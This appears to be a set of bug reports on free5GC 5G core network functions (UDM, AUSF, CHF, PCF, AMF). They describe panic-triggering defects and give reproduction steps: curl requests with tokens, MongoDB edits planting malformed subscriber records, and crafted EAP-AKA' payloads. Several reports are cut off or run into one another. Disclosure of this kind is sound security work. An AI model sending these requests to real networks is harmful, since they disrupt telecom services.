        /go/src/free5gc/NFs/pcf/internal/sbi/api_policyauthorization.go:238 +0x54f
2026-04-27T03:31:20.630944249Z [INFO][PCF][GIN] | 500 |    10.100.200.1 | POST    | /npcf-policyauthorization/v1/app-sessions/BdtRefId-..../delete |  |
```

items.title: [Bugs] UDM generate-auth-data nil sequenceNumber panic
items.body:
## Bug Decription
`UDM` `POST /nudm-ueau/v1/{supiOrSuci}/security-information/generate-auth-data` panics with `runtime error: invalid memory address or nil pointer dereference` when the UDR-stored `AuthenticationSubscription` for the requested subscriber has `sequenceNumber` unset / missing. The handler unconditionally dereferences `authSubs.AuthenticationSubscription.SequenceNumber.Sqn` without checking that the `*SequenceNumber` pointer is non-nil.

The faulty call site is in `GenerateAuthDataProcedure`:

```go
// internal/sbi/processor/generate_auth_data.go:239 (deployed v4.2.2 image, commit on master at audit time)
sqnStr := p.strictHex(authSubs.AuthenticationSubscription.SequenceNumber.Sqn, 12)
```

The model field is a pointer:

```go
// /home/ubuntu/go/pkg/mod/github.com/free5gc/openapi@v1.2.3/models/model_authentication_subscription.go
type AuthenticationSubscription struct {
    ...
    SequenceNumber *SequenceNumber `json:"sequenceNumber,omitempty" ...`
    ...
}
```

The earlier required-field gate at lines 182-212 only validates `EncPermanentKey`/`EncOpcKey`. There is no equivalent validation for `SequenceNumber`. Subscriber records that exist in the UDR / MongoDB without a `sequenceNumber` document (e.g. partial provisioning, schema migration, or a `nudr-dr` consumer that wrote the subscriber without that field) trigger the panic on the very next normal `5G_AKA` authentication attempt.

This is a **separate sink** from the existing `Auts[6:]` slice-bounds panic in the AUTS re-synchronization branch (free5gc/free5gc#930). #930 fires only when `resynchronizationInfo.Auts` is shorter than 6 bytes; this panic fires on the **base** `generate-auth-data` flow (no `resynchronizationInfo` required) and is reachable from a completely well-formed request body.

Relevant code references (latest UDM upstream `630da42` and deployed `v4.2.2` runtime; both contain the same line):
- `NFs/udm/internal/sbi/processor/generate_auth_data.go:239` — panic sink (`SequenceNumber.Sqn` deref)
- `NFs/udm/internal/sbi/processor/generate_auth_data.go:182-212` — `EncPermanentKey`/`EncOpcKey` validation, **no equivalent guard for `SequenceNumber`**
- `NFs/udm/internal/sbi/api_ueauthentication.go:108-181` — `HandleGenerateAuthData` route / body parsing
- `NFs/udm/internal/sbi/api_ueauthentication.go:248-255` — `UEAUThreeLayerPathHandlerFunc` dispatch to `HandleGenerateAuthData`
- `/home/ubuntu/go/pkg/mod/github.com/free5gc/openapi@v1.2.3/models/model_authentication_subscription.go` — `SequenceNumber *SequenceNumber` (pointer)

## To Reproduce
Steps to reproduce the behavior:

1. Run free5GC `v4.2.2` Docker deployment (UDM at `10.100.200.10:8000`, UDR at `10.100.200.8:8000`, NRF at `10.100.200.4:8000`, OAuth enabled).

2. Insert a subscriber **without** the `sequenceNumber` field. This represents a UDR-stored entry that lacks `sequenceNumber` (a state reachable by partial provisioning, schema migration, or by an `nudr-dr` consumer using `PATCH .../authentication-subscription` to alter the document):

```bash
docker exec <mongodb-container> mongo --quiet --eval '
db = db.getSiblingDB("free5gc");
db.subscriptionData.authenticationData.authenticationSubscription.insertOne({
  ueId: "imsi-208930000000099",
  authenticationMethod: "5G_AKA",
  encPermanentKey: "8baf473f2f8fd09487cccbd7097c6862",
  encOpcKey: "8e27b6af0e692e750f32667a3b14605d",
  authenticationManagementField: "8000",
  tenantId: "6f84c01d-30a9-4482-9313-22f09fef58c3"
});
'
```

3. Obtain a valid `nudm-ueau` access token from any registered NF profile (the lab's AMF works):

```bash
TOKEN=$(curl -s -X POST 'http://10.100.200.4:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=client_credentials' \
  --data-urlencode 'nfType=AMF' \
  --data-urlencode 'nfInstanceId=09c2c82b-4ed5-43df-b0fc-c7098d1fa5a0' \
  --data-urlencode 'targetNfType=UDM' \
  --data-urlencode 'scope=nudm-ueau' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
```

4. Send a normal authentication-data generation request for that subscriber:

```bash
curl -i -X POST 'http://10.100.200.10:8000/nudm-ueau/v1/imsi-208930000000099/security-information/generate-auth-data' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  --data '{"servingNetworkName":"5G:mnc093.mcc208.3gppnetwork.org","ausfInstanceId":"abc-123"}'
```

5. Observe `HTTP/1.1 500 Internal Server Error` (Gin recovery), and confirm the panic in UDM logs at `generate_auth_data.go:239`:

```text
HTTP/1.1 500 Internal Server Error
Date: Mon, 27 Apr 2026 01:23:45 GMT
Content-Length: 0
```

UDM container logs:

```text
2026-04-27T01:23:45.849710870Z [INFO][UDM][Suci] Got supi
2026-04-27T01:23:45.850756041Z [ERRO][UDM][GIN] panic: runtime error: invalid memory address or nil pointer dereference
panic({0xde52e0?, 0x1700a90?})
        /usr/local/go/src/runtime/panic.go:783 +0x132
github.com/free5gc/udm/internal/sbi/processor.(*Processor).GenerateAuthDataProcedure(...)
        /go/src/free5gc/NFs/udm/internal/sbi/processor/generate_auth_data.go:239 +0xc01
github.com/free5gc/udm/internal/sbi.(*Server).HandleGenerateAuthData(...)
        /go/src/free5gc/NFs/udm/internal/sbi/api_ueauthentication.go:180 +0x68d
github.com/free5gc/udm/internal/sbi.(*Server).UEAUThreeLayerPathHandlerFunc(...)
        /go/src/free5gc/NFs/udm/internal/sbi/api_ueauthentication.go:253 +0x473
```

The panic is recoverable by Gin (the AMF/AUSF caller sees `500`) but it is reproducible on every subsequent request and can be used to keep `nudm-ueau` failing for the affected subscriber as long as the bad UDR record persists. Each hit also produces a full stack trace in UDM logs, which makes the endpoint a usable amplification primitive for log-volume DoS against UDM.

## Expected Behavior
`UDM` should validate that the UDR-returned `AuthenticationSubscription.SequenceNumber` pointer is non-nil before dereferencing `.Sqn`, mirroring the existing `EncPermanentKey`/`EncOpcKey` guard at lines 182-212. Specifically:

- if `authSubs.AuthenticationSubscription.SequenceNumber == nil` → return `403 Forbidden` with `authenticationRejected` cause and `Detail: "Nil SequenceNumber"`, the same shape used for the `Nil PermanentKey` and length-mismatch branches in the surrounding code
- no `nil pointer dereference` panic should be reachable from any combination of attacker-crafted request body and normally-provisioned (or partially-provisioned) UDR state on the base `5G_AKA` flow
- request handling should not depend on the optional `resynchronizationInfo` branch behaving correctly to avoid the SequenceNumber path

## Environment
- free5GC Version: `v4.2.2`
- UDM binary commit: matches `free5gc/udm:v4.2.2` runtime image; **the same line is also unfixed in the latest upstream commit `630da42`**
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.25.5 linux/amd64` (build toolchain; runtime: `free5gc/udm:v4.2.2` Docker image)
- Validation date: `2026-04-27`
- Deployment: Docker-based lab on the internal SBI network `10.100.200.0/24`. UDM `10.100.200.10`, UDR `10.100.200.8`, NRF `10.100.200.4`, MongoDB `081af9111608_mongodb`.

### Log File
Representative panic trace from the validated reproduction:

```text

goroutine 3427 [running]:
runtime/debug.Stack()
github.com/free5gc/util/logger.NewGinWithLogrus.ginRecover.func2.1()
        /go/pkg/mod/github.com/free5gc/util@v1.3.2-0.20260319090834-b2a2938f37b4/logger/logger.go:298 +0x117
panic({0xde52e0?, 0x1700a90?})
        /usr/local/go/src/runtime/panic.go:783 +0x132
github.com/free5gc/udm/internal/sbi/processor.(*Processor).GenerateAuthDataProcedure(0xc00039caf0, 0xc00053ce00, ...)
        /go/src/free5gc/NFs/udm/internal/sbi/processor/generate_auth_data.go:239 +0xc01
github.com/free5gc/udm/internal/sbi.(*Server).HandleGenerateAuthData(0xc0003804a0, 0xc00053ce00)
        /go/src/free5gc/NFs/udm/internal/sbi/api_ueauthentication.go:180 +0x68d
github.com/free5gc/udm/internal/sbi.(*Server).UEAUThreeLayerPathHandlerFunc(0xc0003804a0, 0xc00053ce00)
        /go/src/free5gc/NFs/udm/internal/sbi/api_ueauthentication.go:253 +0x473
```

items.title: [Bugs] AUSF: nausf-auth POST /ue-authentications panics on malformed UDM discovery results
items.body:
## Bug Description

`POST /nausf-auth/v1/ue-authentications` can panic when `NRF` discovery returns a `UDM` profile whose first advertised NF service has an empty `ipEndPoints` list.

`UeAuthPostRequestProcedure()` calls `GetUdmUrl()`, and `GetUdmUrl()` directly indexes the discovery result:

```go
udmInstance := res.NfInstances[0]
if len(udmInstance.Ipv4Addresses) > 0 && udmInstance.NfServices != nil {
    ueauService := udmInstance.NfServices[0]
    ueauEndPoint := ueauService.IpEndPoints[0]
    udmUrl = string(ueauService.Scheme) + "://" + ueauEndPoint.Ipv4Address + ":" + strconv.Itoa(int(ueauEndPoint.Port))
}
```

There is no length check for `udmInstance.NfServices` or `ueauService.IpEndPoints`. Docker validation on March 20, 2026 reproduced a panic by temporarily changing the `UDM` registration in `NRF` so that `nfServices[0].ipEndPoints` was `[]`, then sending a normal authenticated `POST /nausf-auth/v1/ue-authentications`.

The request returned `500 Internal Server Error`, and Gin recovery logged `runtime error: index out of range [0] with length 0` from `GetUdmUrl()`.

Relevant code: `NFs/ausf/internal/sbi/consumer/nrf_service.go:240`, `NFs/ausf/internal/sbi/processor/ue_authentication.go:275`, `NFs/ausf/internal/sbi/api_ueauthentication.go:176`.

## To Reproduce

1. Obtain a valid `nausf-auth` token for a registered `AMF` instance:

```bash
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=AMF&nfInstanceId=09e35650-e022-43bb-afb1-fdf552607327&targetNfType=AUSF&scope=nausf-auth'
```

2. Temporarily clear the first advertised `UDM` service `ipEndPoints` in `NRF` state:

```bash
docker exec mongodb mongo --quiet --eval '
db.getSiblingDB("free5gc").NfProfile.updateOne(
  { nfType: "UDM" },
  { $set: { "nfServices.0.ipEndPoints": [] } }
)'
```

3. Send a normal authenticated AUSF authentication request:

```bash
curl -i -X POST 'http://10.100.200.7:8000/nausf-auth/v1/ue-authentications' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <valid_nausf_auth_jwt>' \
  --data '{"supiOrSuci":"suci-0-208-93-0-0-0-0000007487","servingNetworkName":"5G:mnc093.mcc208.3gppnetwork.org"}'
```

4. Observe `500 Internal Server Error` and an index-out-of-range panic in `GetUdmUrl()`.

5. Restore the `UDM` registration:

```bash
docker exec mongodb mongo --quiet --eval '
db.getSiblingDB("free5gc").NfProfile.updateOne(
  { nfType: "UDM" },
  { $set: { "nfServices.0.ipEndPoints": [{ ipv4Address: "udm.free5gc.org", transport: "TCP", port: 8000 }] } }
)'
```

## Expected Behavior

Malformed or incomplete discovery results should be rejected with a controlled upstream-error response. AUSF should validate slice lengths before indexing into `nfServices` and `ipEndPoints`, and malformed discovery state should not cause a panic or stack trace.

items.title: [Bugs] AUSF: nausf-auth POST /ue-authentications panics when UDM token acquisition fails (nil ProblemDetails)
items.body:
## Bug Description

`POST /nausf-auth/v1/ue-authentications` can panic when `GenerateAuthDataApi()` returns an error with a nil `ProblemDetails` pointer.

The vulnerable path is:

```go
result, pd, err := p.Consumer().GenerateAuthDataApi(udmUrl, supiOrSuci, authInfoReq)
if err != nil {
    logger.UeAuthLog.Infof("GenerateAuthDataApi error: %+v", err)
    c.Set(sbi.IN_PB_DETAILS_CTX_STR, pd.Cause)
    c.JSON(http.StatusInternalServerError, pd)
    return
}
```

There is no nil check before `pd.Cause`. In the current implementation, `GenerateAuthDataApi()` can propagate token-acquisition errors from `GetTokenCtx()` with `pd == nil`, which makes the dereference reachable from normal request handling.

Docker validation on March 20, 2026 reproduced the crash by obtaining a valid `nausf-auth` token, stopping `NRF`, and then sending a normal authenticated `POST /nausf-auth/v1/ue-authentications`. AUSF returned `500 Internal Server Error`, and Gin recovery logged a nil-pointer panic in `UeAuthPostRequestProcedure`.

Relevant code: `NFs/ausf/internal/sbi/processor/ue_authentication.go:277-280`, `NFs/ausf/internal/sbi/consumer/udm_service.go:91-93`.

## To Reproduce

1. Obtain a valid `nausf-auth` token while `NRF` is still running:

```bash
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=AMF&nfInstanceId=e00dbbea-2d13-4327-8ec6-23093ed41616&targetNfType=AUSF&scope=nausf-auth'
```

2. Stop `NRF`:

```bash
docker stop nrf
```

3. Send a normal authenticated AUSF authentication request:

```bash
curl -i -X POST 'http://10.100.200.7:8000/nausf-auth/v1/ue-authentications' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <valid_nausf_auth_jwt>' \
```

After `POST /namf-comm/v1/subscriptions` creates an AMF status subscription and `PUT /namf-comm/v1/subscriptions/{subscriptionId}` updates it, `DELETE /namf-comm/v1/subscriptions/{subscriptionId}` can panic inside `FindAMFStatusSubscription` with:

Root cause: the subscription map stores a value type on create, but the modify path stores a pointer; delete assumes a value type. Gin recovery surfaces **`500 Internal Server Error`** — DoS on the unsubscribe path for normal client traffic.

Relevant code: `NFs/amf/internal/context/context.go` (`AMFStatusSubscriptions` / `FindAMFStatusSubscription`), `NFs/amf/internal/sbi/processor/subscription.go` (modify vs unsubscribe).

items.title: [Bugs] CHF nchf-convergedcharging POST /chargingdata panics when nFConsumerIdentification is omitted

## Bug Decription
`CHF`'s `POST /nchf-convergedcharging/v3/chargingdata` handler can panic when the request omits `nFConsumerIdentification`.

The request is parsed into `models.ChfConvergedChargingChargingDataRequest` and then passed to `ChargingDataCreate()`. That function dereferences `chargingData.NfConsumerIdentification.NFName` without first checking whether `NfConsumerIdentification` is nil:

```go
consumerId := chargingData.NfConsumerIdentification.NFName
```

Validated Docker reproduction on March 20, 2026 showed that an authenticated minimal request can immediately trigger the panic:

```json
{
  "subscriberIdentifier": "imsi-208930000000003",
  "chargingId": 1,
  "invocationSequenceNumber": 1
}
```

Observed result:

- `CHF` returned `500 Internal Server Error`
- the `chf` container remained running
- `docker logs` showed `panic: runtime error: invalid memory address or nil pointer dereference`

This is a request-level panic DoS on the converged charging create path. In this lab Gin recovery converted the panic into `500`, but the endpoint is still directly and repeatedly triggerable.

Relevant code locations:

- `NFs/chf/internal/sbi/api_convergedcharging.go:135`
- `NFs/chf/internal/sbi/api_convergedcharging.go:166`
- `NFs/chf/internal/sbi/processor/converged_charging.go:168`

items.title: [Bugs] PCF npcf-policyauthorization POST /app-sessions still panics in the current runtime on valid suppFeat=1 requests
items.body:
## Bug Decription
`PCF`'s `POST /npcf-policyauthorization/v1/app-sessions` create path still panics when an
authenticated request enables traffic-routing support with `ascReqData.suppFeat = "1"` but does
not provide `AfRoutReq`.

The vulnerable path is:

```go
if traffRoutSupp {
    pccRule = provisioningOfTrafficRoutingInfo(smPolicy, appID, routeReq, medComp.FStatus)
}
```

Inside `provisioningOfTrafficRoutingInfo()`, `routeReq` is dereferenced without a nil check:

```go
tcData.RouteToLocs = routeReq.RouteToLocs
tcData.UpPathChgEvent = routeReq.UpPathChgSub
pccRule.AppReloc = routeReq.AppReloc
```

In the current runtime validated on March 21, 2026, the route again returned a bare
`500 Internal Server Error` with an empty body when exercised with a valid token and a live UE
address. That behavior is consistent with Gin panic recovery rather than a normal application error
response, so the impact is authenticated request-triggered `PCF` DoS.

Relevant source evidence:

- create route:
  - `NFs/pcf/internal/sbi/api_policyauthorization.go:29`
  - `NFs/pcf/internal/sbi/api_policyauthorization.go:78`
  - `NFs/pcf/internal/sbi/api_policyauthorization.go:119`
- request parsing and `routeReq` derivation:

  - `NFs/pcf/internal/sbi/processor/policyauthorization.go:244`
  - `NFs/pcf/internal/sbi/processor/policyauthorization.go:287`
- nil-dereference sink:

  - `NFs/pcf/internal/sbi/processor/policyauthorization.go:1740`
  - `NFs/pcf/internal/sbi/processor/policyauthorization.go:1741`


3. Send the authenticated create request:


items.title: [Bugs] CHF nchf-convergedcharging POST /chargingdata panics on short nFPLMNID values
items.body:
## Bug Decription
`CHF`'s `POST /nchf-convergedcharging/v3/chargingdata` handler can panic when `nFConsumerIdentification.nFPLMNID.mcc` or `nFPLMNID.mnc` is shorter than expected.

The request reaches `OpenCDR()`, which converts `NFPLMNID` through `cdrConvert.PlmnIdToCdr()`. That helper indexes directly into split `mcc` and `mnc` characters without validating length:

```go
mcc := strings.Split(modelsPlmnid.Mcc, "")
mnc := strings.Split(modelsPlmnid.Mnc, "")
...
hexString = mcc[1] + mcc[0] + mnc[2] + mcc[2] + mnc[1] + mnc[0]
```

Validated Docker reproduction on March 20, 2026 confirmed that an authenticated request with short `mcc` and `mnc` values triggers the panic:

```json
{
  "subscriberIdentifier": "imsi-208930000007487",
  "chargingId": 1,
  "nFConsumerIdentification": {
    "nFName": "amf",
    "nodeFunctionality": "SMF",
    "nFPLMNID": {
```

- `CHF` returned `500 Internal Server Error`
- the `chf` container remained running
- `docker logs` showed `panic: runtime error: index out of range [1] with length 1`

Relevant code locations:

- `NFs/chf/cdr/cdrConvert/sbiToCdr.go:100`
- `NFs/chf/cdr/cdrConvert/sbiToCdr.go:107`
- `NFs/chf/internal/sbi/processor/cdr.go:131`
- `NFs/chf/internal/sbi/processor/converged_charging.go:172`

## To Reproduce
Steps to reproduce the behavior:

1. Obtain a valid `nchf-convergedcharging` token:


## Expected Behavior
`CHF` should reject malformed short PLMN IDs with a controlled `400 Bad Request`, not panic.

Expected behavior:

- validate `mcc` and `mnc` length before indexing into them

items.title: [Bugs] PCF npcf-callback POST /nudr-notify/influence-data/{supi}/{pduSessionId} panics when TrafficInfluData.Snssai is absent
items.body:
## Bug Decription
`PCF` exposes the following callback route:

```text
POST /npcf-callback/v1/nudr-notify/influence-data/{supi}/{pduSessionId}
```

When `HandleInfluenceDataUpdateNotify()` processes a callback notification, it dereferences
`*trafficInfluData.Snssai` without checking whether `Snssai` is present:

```go
trafficInfluData := *notification.TrafficInfluData

filterCharging := bson.M{
    "ueId":   ue.Supi,
    "snssai": util.SnssaiModelsToHex(*trafficInfluData.Snssai),
    "dnn":    "",
    "filter": "",
}
```

The OpenAPI model defines `Snssai` as an optional pointer:

```go
type TrafficInfluData struct {
    ...
    Snssai *Snssai `json:"snssai,omitempty" ...`
    ...
}
```

So a callback element with non-nil `trafficInfluData` but missing `trafficInfluData.snssai`
causes a nil pointer dereference. In the lab, Gin recovery converted the panic into
`500 Internal Server Error`, which makes this a request-triggered `PCF` DoS and log-flooding
issue on the callback surface.

Relevant source evidence:

- callback group is mounted without inbound auth middleware:
  - `NFs/pcf/internal/sbi/server.go:86`
  - `NFs/pcf/internal/sbi/server.go:87`
- vulnerable callback entrypoint:
  - `NFs/pcf/internal/sbi/api_httpcallback.go:117`
  - `NFs/pcf/internal/sbi/api_httpcallback.go:159`
- optional model field:
  - `github.com/free5gc/openapi/models/model_traffic_influ_data.go:29`
- nil-dereference sink:
  - `NFs/pcf/internal/sbi/processor/notifier.go:84`
  - `NFs/pcf/internal/sbi/processor/notifier.go:88`

## To Reproduce
Steps to reproduce the behavior:

1. Keep the Docker free5GC lab running and make sure `PCF` has a live `smPolicyId` for the target
   `{supi}-{pduSessionId}` pair.
2. Send a callback request with a non-nil `trafficInfluData` object that omits `snssai`:

```bash
curl -i -X POST \
  'http://10.100.200.9:8000/npcf-callback/v1/nudr-notify/influence-data/imsi-208930000000003/10' \
  -H 'Content-Type: application/json' \
  --data '[
    {
      "resUri": "<live_udr_influence_data_resource_uri>",
      "trafficInfluData": {
        "dnn": "internet"
      }
    }
  ]'
```

3. Check the HTTP response. In the validated lab, `PCF` returned `500 Internal Server Error`.
4. Dump `pcf` logs and observe the nil pointer dereference shown below.

## Expected Behavior
`PCF` should validate callback input and reject malformed `TrafficInfluDataNotif` content with a
controlled `4xx` response. It should not dereference a nil `Snssai`, and callback routes should not
allow malformed input to trigger panic-based DoS.

## Screenshots
N/A

## Environment
- free5GC Version: `v4.2.1`
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.25.5 linux/amd64`
- Runtime image: `free5gc/pcf:v4.2.1`
- Runtime PCF commit hash: `df535f55`
- Validation date: `2026-03-20`
- Runtime SBI endpoint: `10.100.200.9:8000`

items.title: [Bugs] AMF `namf-comm` DELETE /subscriptions/{subscriptionId} can panic after a valid update, causing denial of service
items.body:
`AMF`'s `DELETE /namf-comm/v1/subscriptions/{subscriptionId}` handler can panic on valid authenticated input after the same subscription has been updated through `PUT /subscriptions/{subscriptionId}`.

In the validated Docker runtime, a valid `namf-comm` token was used to:
- create an AMF status subscription with `201 Created`
- update it with `202 Accepted`
- delete it with `DELETE /namf-comm/v1/subscriptions/{subscriptionId}`

The delete request then triggered a server-side panic and the client received `500 Internal Server Error`.

Validated runtime behavior:
- `POST /namf-comm/v1/subscriptions` -> `201 Created`
- `PUT /namf-comm/v1/subscriptions/4` -> `202 Accepted`
- `DELETE /namf-comm/v1/subscriptions/4` -> `500 Internal Server Error`

The container stayed alive in this lab because Gin recovery converted the panic into `500`, but the endpoint is still crashable by remote network input and can be repeatedly driven into panic.

Code evidence:
- route group and auth middleware:
  - `NFs/amf/internal/sbi/server.go`
  - `NFs/amf/internal/util/router_auth_check.go`
- create stores a value type in `AMFStatusSubscriptions`:
  - `NFs/amf/internal/context/context.go`
- modify stores a pointer type back into the same map:
  - `NFs/amf/internal/sbi/processor/subscription.go`
- delete path calls `FindAMFStatusSubscription`, which type-asserts to the value type and panics after the prior `PUT`:
  - `NFs/amf/internal/context/context.go`
  - `NFs/amf/internal/sbi/processor/subscription.go`

## To Reproduce
Steps to reproduce the behavior:

1. Obtain a valid `namf-comm` token:
```bash
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
```

2. Create an AMF status subscription:

```bash
curl -i -X POST 'http://10.100.200.16:8000/namf-comm/v1/subscriptions' \

  --data '{"amfStatusUri":"http://127.0.0.1:9999/amfstatus","guamiList":[{"plmnId":{"mcc":"208","mnc":"93"},"amfId":"cafe00"}]}'
```

Observed output:
```text
HTTP/1.1 201 Created
```

3. Update the same subscription:
```bash
curl -i -X PUT 'http://10.100.200.16:8000/namf-comm/v1/subscriptions/4' \
```

Observed output:

```text
HTTP/1.1 202 Accepted
```

```bash
curl -i -X DELETE 'http://10.100.200.16:8000/namf-comm/v1/subscriptions/4' \
```

`DELETE /namf-comm/v1/subscriptions/{subscriptionId}` should not panic on valid network input.

- free5GC Version: local source tree tag `v4.2.1`
- Runtime validation target: Docker container `amf`
- Runtime validation SBI endpoint: `10.100.200.16:8000`
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.24.9 linux/amd64`
- Validation date: `2026-03-12`

Default lab config; OAuth enabled.

### PCAP File
Not attached in this draft.

### Log File
Docker `amf` log excerpt:
```text
2026-03-12T04:14:59Z [INFO][AMF][GIN] | 201 | 10.100.200.1 | POST   | /namf-comm/v1/subscriptions |
2026-03-12T04:14:59Z [INFO][AMF][GIN] | 202 | 10.100.200.1 | PUT    | /namf-comm/v1/subscriptions/4 |
2026-03-12T04:14:59Z [ERRO][AMF][GIN] panic: interface conversion: interface {} is *models.AmfCommunicationSubscriptionData, not models.AmfCommunicationSubscriptionData
2026-03-12T04:14:59Z [INFO][AMF][GIN] | 500 | 10.100.200.1 | DELETE | /namf-comm/v1/subscriptions/4 |
```

## System Architecture (Optional)
Docker-based free5GC lab, internal SBI network, AMF at `10.100.200.16:8000`, NRF at `10.100.200.3:8000`.

## Walkthrough (Optional)
This issue is an implementation defect in the AMF status subscription lifecycle:
- create stores a value-type subscription object
- update stores a pointer-type subscription object into the same `sync.Map`
- delete first calls a helper that type-asserts the map value back to the value type
- that assertion panics after a prior successful `PUT`

The authorization weakness that lets unrelated same-scope callers reach this path should be tracked separately. This report focuses on the panic-based denial-of-service condition.

## Additional Context
- The panic is stable and reproducible. It was observed repeatedly for subscription IDs `2`, `3`, and `4` in the same runtime.
- In this lab the process stayed up because Gin recovery handled the panic, but the endpoint is still remotely crashable and log-floodable.

items.title: [Bugs] AUSF decodeEapAkaPrime index out-of-bounds panic
items.body:
## Bug Decription
`AUSF` `POST /nausf-auth/v1/ue-authentications/{authCtxId}/eap-session` panics with `runtime error: index out of range` inside `decodeEapAkaPrime` when the supplied (base64-decoded) `eapPayload` is parseable by `gopacket` as an EAP Response of type 50 (EAP-AKA') but is shorter than the byte offsets that the AUSF parser indexes unconditionally.

There are at least two sub-panics in the same function with no length guards before the array reads:

1. **`data[0]` panic** when `eapPayload` is exactly **5 bytes** (EAP header only, no Type-Data). After `data := eapPkt[5:]` the slice is empty; the very next line `decodePkt.Subtype = data[0]` indexes off the end of the empty slice.

2. **`data[i+1]` panic** when `eapPayload` is exactly **9 bytes**. The slice `data` is 4 bytes (`subtype + 2 reserved + 1 attrType`) but no `attrLen` byte. The attribute loop starts at `i = 3` and tries `data[i+1] = data[4]`, which is out of range.

Both fire **after** the existing nil-eapContent check (free5gc/free5gc#981 / merged as `44dd406a` "fix: check for nil EAP content before accessing fields") so they are reachable on the deployed `free5gc/ausf:v4.2.2` binary, and the same lines are still **unfixed at the latest upstream commit `cf2aba6`** (no length validation has been added to `decodeEapAkaPrime`).

This is **distinct from**:
- free5gc/free5gc#898 — covers the gopacket-returns-nil eapContent path (`eapContent.Code` deref). Fixed in deployed `44dd406a`. After that fix, `decodeEapAkaPrime` becomes reachable and now panics on a different line.
- free5gc/free5gc#948 — covers `ueid[5:]` slicing in the EAP-AKA' SUPI handling **inside `UeAuthPostRequestProcedure`**, on the success-from-UDM path; not the EAP confirm/EAP-session handler.

Faulty call sites (deployed `v4.2.2` line numbers; same code unchanged in latest upstream `cf2aba6` lines 727 / 728 / 734):

```go
// internal/sbi/processor/ue_authentication.go
func decodeEapAkaPrime(eapPkt []byte) (*ausf_context.EapAkaPrimePkt, error) {
    var decodePkt ausf_context.EapAkaPrimePkt
    var attrLen int
    var decodeAttr ausf_context.EapAkaPrimeAttribute
    attributes := make(map[uint8]ausf_context.EapAkaPrimeAttribute)
    data := eapPkt[5:]                               // <-- 717: panic if len(eapPkt) < 5
    decodePkt.Subtype = data[0]                       // <-- 717-area: panic if len(data) == 0  (5-byte payload)
    dataLen := len(data)

    for i := 3; i < dataLen; i += attrLen {
        attrType := data[i]
        attrLen = int(data[i+1]) * 4                  // <-- 723: panic if i+1 >= dataLen (9-byte payload, dataLen==4, i==3, i+1==4)
        if attrLen == 0 { ... }
        if i + attrLen > dataLen { ... }
        ...
```

## To Reproduce
Steps to reproduce the behaviour:

1. Run free5GC `v4.2.2` Docker deployment (AUSF at `10.100.200.7:8000`, NRF at `10.100.200.4:8000`, OAuth enabled).

2. Provision a subscriber whose authentication method is `EAP_AKA_PRIME` (the panic only fires on the EAP-AKA' confirm path):

```bash
docker exec <mongodb> mongo --quiet --eval '
db = db.getSiblingDB("free5gc");
db.subscriptionData.authenticationData.authenticationSubscription.insertOne({
  ueId: "imsi-208930000000077",
  authenticationMethod: "EAP_AKA_PRIME",
  encPermanentKey: "8baf473f2f8fd09487cccbd7097c6862",
  encOpcKey: "8e27b6af0e692e750f32667a3b14605d",
  authenticationManagementField: "8000",
  sequenceNumber: { sqn: "000000000001" },
  tenantId: "6f84c01d-30a9-4482-9313-22f09fef58c3"
});
'
```

3. Obtain a `nausf-auth` token from any registered NF (the lab AMF works):

```bash
TOKEN=$(curl -s -X POST 'http://10.100.200.4:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=client_credentials' \
  --data-urlencode 'nfType=AMF' \
  --data-urlencode 'nfInstanceId=09c2c82b-4ed5-43df-b0fc-c7098d1fa5a0' \
  --data-urlencode 'targetNfType=AUSF' \
  --data-urlencode 'scope=nausf-auth' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
```

4. Start an EAP-AKA' session for the subscriber to obtain a valid `authCtxId`:

```bash
curl -s -X POST 'http://10.100.200.7:8000/nausf-auth/v1/ue-authentications' \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  --data '{"supiOrSuci":"imsi-208930000000077","servingNetworkName":"5G:mnc093.mcc208.3gppnetwork.org"}' \
  -i | head
# 201 Created with Location header → use the supi as authCtxId in the next step
```

5. Send a malformed EAP payload to the eap-session endpoint. Either of the two sub-cases triggers a panic:

**Sub-case A: 9-byte EAP-AKA' packet → `index out of range [4] with length 4` (line 723)**

```bash
PAYLOAD=$(python3 -c "
import base64
print(base64.b64encode(bytes([
    0x02,        # Code = Response
    0x01,        # Identifier
    0x00, 0x09,  # Length = 9
    0x32,        # Type = 50 (EAP-AKA')
    0x01,        # subtype
    0x00, 0x00,  # reserved
    0xAA         # 1-byte 'attrType' but no attrLen byte
])).decode())")
# PAYLOAD = "AgEACTIBAACq"

curl -i -X POST 'http://10.100.200.7:8000/nausf-auth/v1/ue-authentications/imsi-208930000000077/eap-session' \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  --data "{\"eapPayload\":\"$PAYLOAD\"}"
```

**Sub-case B: 5-byte EAP-AKA' packet → `index out of range [0] with length 0` (line 717)**

```bash
PAYLOAD=$(python3 -c "
import base64
print(base64.b64encode(bytes([0x02,0x01,0x00,0x05,0x32])).decode())")
# PAYLOAD = "AgEABTI="

curl -i -X POST 'http://10.100.200.7:8000/nausf-auth/v1/ue-authentications/imsi-208930000000077/eap-session' \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  --data "{\"eapPayload\":\"$PAYLOAD\"}"
```

6. Both return `HTTP/1.1 500 Internal Server Error` (Gin recovery converts the panic), and the AUSF logs show:

```text
[INFO][AUSF][5gAka] EapAuthComfirmRequest
[ERRO][AUSF][GIN] panic: runtime error: index out of range [4] with length 4
